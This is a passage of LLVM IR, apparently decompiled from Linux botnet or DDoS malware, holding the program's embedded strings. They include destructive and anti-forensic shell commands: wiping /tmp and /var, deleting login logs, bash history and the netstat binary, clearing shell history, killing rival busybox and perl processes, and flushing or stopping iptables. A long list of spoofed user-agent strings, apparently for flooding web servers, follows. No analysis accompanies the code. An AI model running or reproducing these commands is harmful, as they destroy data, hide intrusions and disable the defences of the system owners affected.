@global_var_20d0c.837, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_20d18.838, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_20d28.839, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_20d3c.840, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_20d48.841, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20d54.842, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_20d64.843, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_20d74.844, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_20d80.845, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_20d90.846, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20da0.847, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_20db0.848, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20dc0.849, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20dcc.850, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20dd8.851, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_20de8.852, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20df8.853, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20e08.854, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_20e18.855, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_20e24.856, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_20e34.857, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_20e48.858, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_20e54.859, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20e60.860, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_20e70.861, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20e80.862, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20e84.863, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20e88.864, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20e8c.865, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20e90.866, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20e94.867, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20e98.868, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20e9c.869, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20ea0.870, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20ea4.871, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20eac.872, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20eb4.873, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20ebc.874, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20ec4.875, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20ecc.876, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20ed4.877, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20edc.878, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20ee4.879, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20eec.880, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20ef4.881, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_20efc.882, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20f10.883, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20f1c.884, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_20f28.885, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20f34.886, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20f3c.887, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20f48.888, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20f54.889, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20f5c.890, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20f68.891, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_20f74.892, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20f80.893, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20f8c.894, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20f98.895, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20fa4.896, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20fb0.897, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20fb8.898, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20fc0.899, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_20fcc.900, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20fd8.901, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20fe4.902, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_20ff0.903, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_20ffc.904, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_21008.905, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2101c.906, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21028.907, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21034.908, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21040.909, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2104c.910, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21058.911, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21064.912, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21070.913, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2107c.914, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21088.915, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21090.916, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21098.917, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_210a4.918, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_210b0.919, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_210bc.920, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_210c8.921, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_210d4.922, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_210e0.923, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_210f4.924, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21100.925, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2110c.926, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21118.927, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21124.928, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21130.929, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2113c.930, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21148.931, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21154.932, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21160.933, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21168.934, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21170.935, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2117c.936, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21188.937, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21194.938, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_211a0.939, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_211ac.940, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_211b8.941, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_211cc.942, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_211d8.943, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_211e4.944, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_211f0.945, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_211fc.946, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_2120c.947, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_2121c.948, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2122c.949, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_2123c.950, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2124c.951, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21258.952, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21264.953, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_21274.954, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21284.955, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21294.956, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_212a4.957, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_212b4.958, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_212c4.959, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_212dc.960, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_212ec.961, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_212fc.962, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_2130c.963, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2131c.964, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20c60.825, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21328.965, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21334.966, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2133c.967, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21344.968, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2134c.969, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21354.970, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2135c.971, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21364.972, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2136c.973, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21374.974, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_2137c.975, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21384.976, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_2138c.977, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21394.978, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_2139c.979, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_213a4.980, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_213ac.981, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_213b4.982, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_213bc.983, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_213c4.984, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_213cc.985, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_213d4.986, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_213d8.987, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_213dc.988, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_213e0.989, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_213e4.990, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_213e8.991, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_213ec.992, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_213f0.993, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_213f4.994, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_213f8.995, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_213fc.996, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21400.997, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21404.998, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21408.999, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2140c.1000, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21410.1001, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21414.1002, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21418.1003, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2141c.1004, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21420.1005, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21424.1006, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21428.1007, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21434.1008, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_2143c.1009, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21444.1010, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2144c.1011, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21450.1012, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21454.1013, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21458.1014, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2145c.1015, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21460.1016, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21464.1017, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21468.1018, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2146c.1019, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21470.1020, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21478.1021, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21480.1022, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21488.1023, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21490.1024, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21498.1025, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_214a0.1026, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_214a8.1027, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_214b0.1028, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_214b8.1029, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_214c0.1030, i32 0, i32 0)]
@global_var_2254c.1033 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_225d0.1037 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_225e0.1039 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_2260c.1041 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_22624.1043 = constant [22 x i8] c"history -c;history -w\00"
@global_var_2263c.1045 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_2264c.1047 = constant [11 x i8] c"history -c\00"
@global_var_22658.1049 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_22670.1051 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_22684.1053 = constant [11 x i8] c"history -w\00"
@global_var_22690.1055 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_226a4.1057 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_226b4.1059 = constant [22 x i8] c"service iptables stop\00"
@global_var_226cc.1061 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_22718.1063 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_22758.1064 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_22798.1065 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_22828.1066 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_22860.1067 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_22880.1068 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_22898.1069 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_228f0.1070 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_22990.1071 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_229e4.1072 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_22a58.1073 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_22a98.1074 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_22b50.1075 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_22ba4.1076 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_22bfc.1077 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_22c54.1078 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_22c94.1079 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_22cdc.1080 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_22d34.1081 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_22da0.1082 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_22df8.1083 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_22e48.1084 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_22e6c.1085 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_22ec8.1086 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_22ed8.1087 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_22f08.1088 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_22f2c.1089 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_22f50.1090 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_22f6c.1091 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_22fac.1092 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_23038.1093 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_23080.1094 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_230c8.1095 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_23110.1096 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_23158.1097 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_231ac.1098 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_231fc.1099 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_23268.1100 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_232bc.1101 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_23318.1102 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_23374.1103 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_233d8.1104 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_23434.1105 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_23490.1106 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_234ec.1107 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_2354c.1108 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_23594.1109 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_2362c.1110 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_23678.1111 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_236c4.1112 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_23714.1113 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_2375c.1114 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_237b0.1115 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_23800.1116 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_23848.1117 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_23894.1118 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_238e0.1119 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_23928.1120 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_23978.1121 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_239c8.1122 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_239fc.1123 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_23a30.1124 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
